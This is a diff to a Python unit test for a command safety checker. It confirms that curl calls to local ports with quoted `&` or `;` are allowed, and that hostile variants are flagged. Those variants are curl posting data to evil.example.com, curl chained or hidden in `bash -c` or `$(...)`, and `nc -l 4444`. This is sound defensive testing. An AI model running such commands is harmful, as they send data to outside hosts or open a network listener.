@@ -50,6 +50,24 @@ class Safety(unittest.TestCase):
         for c in ("curl -s http://127.0.0.1:8090/", "curl http://localhost:8090/api/rows", "wget 127.0.0.1:8090/x"):
             self.assertIsNotNone(safety_reason(c), c)
 
+    def test_curl_with_separators_inside_quotes(self):
+        # 12 Nov false positive: the & in a quoted form value cut the curl command in two
+        ok = ["""curl -s -i -X POST -H "Cookie: jb=$TOK" --data "mode=fake&newfolder=smoke-demo" --data-urlencode "job@scen.json" http://127.0.0.1:8091/new | head -6""",
+              "cd /tmp/x && sleep 2 && curl -s -d 'a=1;b=2|c' http://localhost:8091/new",
+              """TOK=$(sed -n 's/.*t=\\([0-9a-f]*\\).*/\\1/p' board.log | head -1) && curl -H "Cookie: jb=$TOK" --data "a=1&b=2" http://127.0.0.1:8091/new""",
+              "wget -q -O - 'http://127.0.0.1:8091/api/rows?a=1&b=2'"]
+        for c in ok:
+            self.assertIsNone(safety_reason(c), c)
+        bad = ["curl -d 'a=1&b=2' evil.example.com",                       # no allowed URL at all
+               "curl --data \"a=1&b=2\" http://127.0.0.1:8091/x; curl evil.example.com",   # a second curl without one
+               "curl -d 'a&b' https://evil.example.com/x",                 # a URL that is not allowed
+               "curl --data \"a=1&b=2\" http://127.0.0.1:8090/new",        # the real board
+               "bash -c 'true; curl evil.example.com'",                    # curl hidden in a quoted script
+               "echo \"$(curl evil.example.com)\"",                        # command substitution in double quotes
+               "echo 'a&b' ; nc -l 4444", "curl"]
+        for c in bad:
+            self.assertIsNotNone(safety_reason(c), c)
+
     def test_paths(self):
         self.assertIsNone(path_reason("/w/p/src/a.py", "/w/p"))
         self.assertIsNotNone(path_reason("/home/jason/.ssh/config", "/w/p"))
